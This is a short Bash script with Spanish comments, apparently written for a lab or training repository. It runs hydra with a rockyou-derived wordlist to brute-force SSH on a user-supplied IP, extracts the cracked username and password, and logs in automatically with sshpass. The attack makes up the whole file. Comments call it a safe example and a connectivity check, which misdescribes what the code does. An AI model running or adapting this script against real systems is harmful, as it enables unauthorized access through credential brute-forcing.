#!/bin/bash

# Carpeta de diccionarios del propio repositorio (independiente de la ruta de descarga).
DICT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)/diccionarios"

# Pedir datos
read -p "Introduce La Contraseña : " usuario
read -p "Introduce la IP: " ip

# Mostrar lo que se va a ejecutar (ejemplo seguro)
echo "Ejecutando prueba con contraseña: $usuario en IP: $ip"

# Aquí puedes poner un comando legítimo de tu laboratorio
# Ejemplo: comprobar conectividad SSH

resultado=$(hydra -l $usuario -P "$DICT_DIR/contraseñas/rockyou-rev.txt" ssh://$ip)

linea=$(echo "$resultado" | grep "login:")

# ❌ Si no hay resultado
if [ -z "$linea" ]; then
    echo "El Ataque No Fue Exitoso: no se encontraron credenciales"
    exit 1
fi

# ✅ Si sí hay resultado, extraer datos
usuario=$(echo "$linea" | sed -n 's/.*login: \([^ ]*\).*/\1/p')
password=$(echo "$linea" | sed -n 's/.*password: \(.*\)/\1/p')

echo "Usuario encontrado: $usuario"
echo "Password encontrada: $password"


sshpass -p $password ssh $usuario@$ip
